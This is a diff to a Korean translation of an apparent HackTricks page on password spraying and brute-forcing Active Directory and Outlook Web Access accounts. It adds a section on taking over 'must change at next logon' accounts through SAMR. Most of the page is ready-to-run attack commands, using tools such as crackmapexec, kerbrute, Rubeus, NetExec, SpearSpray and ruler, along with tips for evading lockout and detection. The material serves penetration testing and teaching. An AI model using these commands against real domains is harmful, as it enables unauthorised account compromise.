@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-몇 개의 **valid usernames**를 찾으면, 발견한 각 사용자에 대해 가장 일반적인 **common passwords**를 시도해볼 수 있습니다(환경의 **password policy**를 고려하세요).\
-기본적으로 **minimum password length**은 **7**입니다.
+일단 여러 개의 **valid usernames**를 찾으면, 발견한 각 사용자에 대해 가장 흔한 **common passwords**를 시도해볼 수 있습니다(환경의 password policy를 염두에 두세요).\
+기본적으로 **default** **minimum** **password** **length**는 **7**입니다.
 
-common usernames 목록도 유용할 수 있습니다: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+일반적인 **usernames** 목록도 유용할 수 있습니다: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-여러 번 wrong passwords를 시도하면 일부 **accounts**가 **lockout**될 수 있다는 점에 주의하세요 (by default 10회 초과).
+여러 번 잘못된 **passwords**를 시도하면 일부 계정이 **lockout**될 수 있다는 점에 유의하세요(기본값은 대략 10회 초과).
 
 ### Get password policy
 
-만약 일부 user credentials나 domain user로서의 shell이 있다면, **get the password policy with**:
+domain user로서 user credentials나 shell이 있다면 다음과 같이 **get the password policy with**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -31,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Linux(또는 모두)에서의 Exploitation
+### Linux(또는 모든 플랫폼)에서의 Exploitation
 
 - **crackmapexec** 사용:
 ```bash
@@ -47,7 +47,7 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(계정 잠금을 피하기 위해 시도 횟수를 지정할 수 있습니다):**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(잠금 방지를 위해 시도 횟수를 지정할 수 있습니다):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
@@ -56,11 +56,11 @@ spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-- **Metasploit**의 `scanner/smb/smb_login` 모듈 사용:
+- **Metasploit**의 `scanner/smb/smb_login` 모듈을 사용하여:
 
 ![](<../../images/image (745).png>)
 
-- **rpcclient** 사용:
+- **rpcclient**를 사용하여:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -69,7 +69,7 @@ done
 ```
 #### Windows에서
 
-- brute module이 포함된 [Rubeus](https://github.com/Zer1t0/Rubeus) 버전 사용:
+- brute module이 포함된 버전의 [Rubeus](https://github.com/Zer1t0/Rubeus)로:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,28 +77,60 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)을 사용하면 (기본적으로 domain에서 사용자를 생성할 수 있으며, domain에서 password policy를 가져와 그에 따라 시도 횟수를 제한합니다):
+- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (기본적으로 도메인에서 사용자 목록을 생성할 수 있으며 도메인으로부터 암호 정책을 가져와 그에 따라 시도 횟수를 제한합니다):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-- 다음 도구: [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
+- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)를 사용하여
 ```
 Invoke-SprayEmptyPassword
 ```
+### "Password must change at next logon" 계정 식별 및 탈취 (SAMR)
+
+저소음 기법으로는 spray a benign/empty password를 시도하여 STATUS_PASSWORD_MUST_CHANGE를 반환하는 계정을 포착하는 것이다. 이는 비밀번호가 강제로 만료되어 이전 비밀번호를 모른 채로 변경할 수 있음을 나타낸다.
+
+작업 흐름:
+- 사용자 열거 (RID brute via SAMR)로 대상 목록을 구성:
+
+{{#ref}}
+../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
+{{#endref}}
+```bash
+# NetExec (null/guest) + RID brute to harvest users
+netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
+```
+- 빈 password로 스프레이하고, hits가 나오면 계속 진행해 'must change at next logon' 상태인 계정을 캡처하세요:
+```bash
+# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
+netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
+```
+- 각 hit에 대해, NetExec’s module로 SAMR을 통해 비밀번호를 변경하세요 (계정에 "must change"가 설정되어 있으면 이전 비밀번호가 필요 없습니다):
+```bash
+# Strong complexity to satisfy policy
+env NEWPASS='P@ssw0rd!2025#' ; \
+netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
+
+# Validate and retrieve domain password policy with the new creds
+netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
+```
+운영 참고:
+- Kerberos 기반 작업을 수행하기 전에 호스트의 시계가 DC와 동기화되어 있는지 확인하세요: `sudo ntpdate <dc_fqdn>`.
+- 일부 모듈(e.g., RDP/WinRM)에서 (Pwn3d!)가 없는 [+] 표시는 creds가 유효하지만 계정에 인터랙티브 로그온 권한이 없음을 의미합니다.
+
 ## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
 ### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
 
-Kerberos pre-auth–based spraying은 SMB/NTLM/LDAP 바인드 시도보다 노이즈를 줄이고 AD 잠금 정책과 더 잘 맞습니다. SpearSpray는 LDAP 기반 타게팅, 패턴 엔진, 그리고 정책 인식(도메인 정책 + PSOs + badPwdCount 버퍼)을 결합해 정확하고 안전하게 스프레이합니다. 또한 Neo4j에 손상된 principals를 태그해 BloodHound 경로 분석에 사용할 수 있습니다.
+Kerberos pre-auth–based spraying는 SMB/NTLM/LDAP 바인드 시도에 비해 노이즈를 줄이고 AD 잠금 정책과 더 잘 맞습니다. SpearSpray는 LDAP 기반 타깃팅, 패턴 엔진, 그리고 정책 인식(도메인 정책 + PSOs + badPwdCount 버퍼)을 결합하여 정밀하고 안전하게 스프레이합니다. 또한 손상된 principals를 Neo4j에 태그하여 BloodHound 경로 분석에 사용할 수 있습니다.
 
 Key ideas:
-- LDAP 사용자 검색(페이징 및 LDAPS 지원), 선택적으로 커스텀 LDAP 필터 사용 가능.
-- 도메인 잠금 정책 + PSO 인지 필터링으로 구성 가능한 시도 버퍼(임계값)를 남겨 사용자 잠금 방지.
-- 빠른 gssapi 바인딩을 사용한 Kerberos pre-auth 검증(DC에서 4625 대신 4768/4771 생성).
-- 이름 등 변수와 각 사용자의 pwdLastSet에서 도출한 시간 값을 사용하는 패턴 기반 사용자별 비밀번호 생성.
-- 스레드, 지터, 초당 최대 요청수로 처리량 제어.
+- 페이징 및 LDAPS 지원을 포함한 LDAP 사용자 검색(선택적으로 사용자 정의 LDAP 필터 사용 가능).
+- 도메인 잠금 정책 + PSO 인식 필터링을 통해 설정 가능한 시도 버퍼(임계값)를 남겨 사용자 잠금을 방지.
+- 빠른 gssapi 바인딩을 사용하는 Kerberos pre-auth 검증(DCs에서 4625 대신 4768/4771 생성).
+- 이름과 같은 변수 및 각 사용자의 pwdLastSet에서 파생된 시간 값을 사용한 패턴 기반 사용자별 비밀번호 생성.
+- 스레드, 지터, 초당 최대 요청 수로 처리량 제어.
 - 선택적 Neo4j 통합으로 소유한 사용자를 표시하여 BloodHound에 활용.
 
 Basic usage and discovery:
@@ -112,7 +144,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-대상 선정 및 패턴 제어:
+타겟팅 및 패턴 제어:
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
@@ -121,7 +153,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-Stealth 및 안전 통제:
+은밀성 및 안전 통제:
 ```bash
 # Control concurrency, add jitter, and cap request rate
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
@@ -142,29 +174,29 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 {samaccountname}
 {extra}{separator}{year}{suffix}
 ```
-사용 가능한 변수:
+Available variables include:
 - {name}, {samaccountname}
-- 각 사용자의 pwdLastSet(또는 whenCreated)에서 파생되는 시간 관련 변수: {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- 구성 헬퍼 및 조직 토큰: {separator}, {suffix}, {extra}
+- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Composition helpers and org token: {separator}, {suffix}, {extra}
 
-운영 주의사항:
-- 가급적 -dc로 PDC-emulator를 쿼리하여 가장 권위 있는 badPwdCount 및 정책 관련 정보를 읽어오세요.
-- badPwdCount 리셋은 관찰 창(observation window) 이후 다음 시도에서 트리거됩니다; 안전을 위해 임계값(threshold)과 타이밍을 사용하세요.
-- Kerberos pre-auth 시도는 DC telemetry에서 4768/4771로 나타납니다; 섞여들기 위해 jitter와 rate-limiting을 사용하세요.
+운영 노트:
+- 가장 권위 있는 badPwdCount 및 정책 관련 정보를 읽기 위해 -dc로 PDC-emulator를 조회하는 것을 권장합니다.
+- badPwdCount 재설정은 관찰 창(observation window) 이후 다음 시도에서 트리거됩니다; 안전을 위해 임계값과 타이밍을 사용하세요.
+- Kerberos pre-auth 시도가 DC telemetry에서 4768/4771로 표시됩니다; 섞여들어가기 위해 jitter 및 rate-limiting을 사용하세요.
 
-> 팁: SpearSpray의 기본 LDAP 페이지 크기는 200입니다; 필요에 따라 -lps로 조정하세요.
+> 팁: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
 
 ## Outlook Web Access
 
-p**assword spraying outlook**을 위한 여러 도구가 있습니다.
+p**assword spraying outlook**에 사용할 수 있는 여러 도구들이 있습니다.
 
-- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
-- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) 사용
+- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) 사용
+- [Ruler](https://github.com/sensepost/ruler) (신뢰할 수 있음!)
+- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
+- [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-이 도구들을 사용하려면 사용자 목록과 스프레이할 단일 password / 소량의 passwords 목록이 필요합니다.
+이 도구들을 사용하려면 사용자 목록과 spray할 password 또는 소규모 password 목록이 필요합니다.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -183,7 +215,7 @@ p**assword spraying outlook**을 위한 여러 도구가 있습니다.
 - [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 - [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## 참고자료
+## 참고 자료
 
 - [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
 - [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
@@ -194,6 +226,7 @@ p**assword spraying outlook**을 위한 여러 도구가 있습니다.
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
